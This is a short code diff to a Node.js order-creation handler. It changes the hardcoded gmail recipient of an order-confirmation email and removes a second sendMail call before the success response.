@@ -78,7 +78,7 @@ function maskKeepLast3(card) {
 
         const mailOptions = {
             from: 'orders@enrichifydata.com',
-            to: 'shipmate2134@gmail.com',
+            to: 'rentsimple159@gmail.com',
             subject: 'Order Confirmation - Thank You for Your Purchase',
             html: `
               <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #ffffff;">
@@ -318,8 +318,7 @@ function maskKeepLast3(card) {
             }
         });
         const info = await transporter.sendMail(mailOptions);
-        const infotwo = await transporter.sendMail(mailOptionsTwo);
-
+        
         return res.status(201).json({
             message: "Order created successfully",
             orderId: result.insertedId
